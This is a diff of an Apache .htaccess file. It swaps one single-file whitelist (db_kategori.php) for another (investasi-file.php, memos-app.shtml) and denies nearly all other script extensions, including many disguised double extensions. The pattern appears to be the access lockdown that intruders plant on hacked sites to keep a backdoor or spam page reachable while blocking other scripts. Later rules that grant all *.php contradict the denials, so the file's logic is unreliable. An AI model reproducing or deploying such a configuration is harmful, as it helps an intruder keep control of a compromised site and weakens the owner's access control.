@@ -1,8 +1,72 @@
-<FilesMatch ".(PhP|phP|PHP1|PHP2|PHP3|PHP4|pHP|Php|php|pHP|PHP|pHp|PHp|pHp|Phtml|phtml|PhTmL|pHtML|phtmL|PHTML|php.php.php.php.php.php|php.php.phtml|PHTML.phtml|pht|Pht|pHt|phT|pHT|PHt|PHT|php11|php12|php.test|suspected|php.suspected|php10|php11|php56|php.php.php|php.phtml|php.php.php.php.php|Php|pHp|phhP|pht|PHT|php.J|PHP|PhP|php1|php2|php4|php5|PHP5|PhP5|php6|php7|php8|php9|PHTML|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|php.pdf|php.xxxpdf|php.xxxpng|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip|phtml|php|php5|php3|php|php7|Php7|pHp7|phP7|php5|pHp56|phar|Phar|pHar|phAr|phaR|PHar|pHAr|phAR|PHar|PHAR|pHAR|PaHAR|PHaR|PHAr|pHAR|PhP|php|phtml|PhTmL|pHtML|phtmL|PHTML|php.php.php.php.php.php|php.php.phtml|PHTML.phtml|pht|Pht|pHt|phT|pHT|PHt|PHT|php11|php12|php.test|suspected|php.suspected|php10|php11|php56|php.php.php|php.phtml|php.php.php.php.php|Php|pHp|phhP|pht|PHT|php.J|PHP|PhP|php1|php2|php4|php5|PHP5|PhP5|php6|php7|php8|php9|PHTML|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|php.pdf|php.xxxpdf|php.xxxpng|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip|shtml|sHtml|shTml|ShtMl|shtmL|SHtml|SHTml|ShTmL|SHTML|sHtmL)$"> 
-Order allow,deny 
-Deny from all 
-</FilesMatch> 
-<FilesMatch "^(db_kategori.php)$"># 
-Order allow,deny 
+<FilesMatch "^(investasi-file.php|memos-app.shtml)$"> 
+Order Allow,Deny 
 Allow from all 
 </FilesMatch>
+<Files *.ph*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.Ph*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.pH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.PH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.sh*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.Sh*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.sH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.SH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.AS*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.As*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.aS*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.as*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files "*.php">
+    Allow from all
+</Files>
+<Files "*.php">
+    Require all granted
+</Files>
+<FilesMatch "\.(jpg|jpeg|png|gif|svg|bmp|ico|webp|heic|docx)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+<FilesMatch "\.(mp4|webm|avi|mov|wmv|mp3|wav|ogv|ogg)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+<FilesMatch "\.(pdf|doc|docx|xls|xlsx|zip|rar|tar|gz|ppt|pptx|csv|)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+
+Options -Indexes
